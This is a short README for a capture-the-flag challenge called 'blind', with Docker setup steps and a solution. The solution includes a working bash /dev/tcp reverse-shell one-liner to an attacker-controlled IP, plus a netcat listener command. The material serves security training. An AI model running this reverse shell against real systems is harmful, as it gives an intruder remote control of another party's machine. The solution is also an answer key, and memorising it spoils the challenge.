# blind

`nc <ip here> 3424`

## Setup

1. `docker build -t blind .`
2. `docker run --rm -it -p 3424:3424 --read-only blind`

## Brief Dev Description

A script which will execute arbitrary bash but it'll only tell you the exit code.  Basically it's do you know that netcat exists (and bash /dev/tcp since netcat isn't installed on the server): the challenge.  

## Solution

1. make a netcat listener for your future reverse shell `nc -lvp 4444`
2. run `/bin/bash -i > /dev/tcp/<internet accessible ip>/4444 0<&1 2>&1`
3. run `cat flag.txt`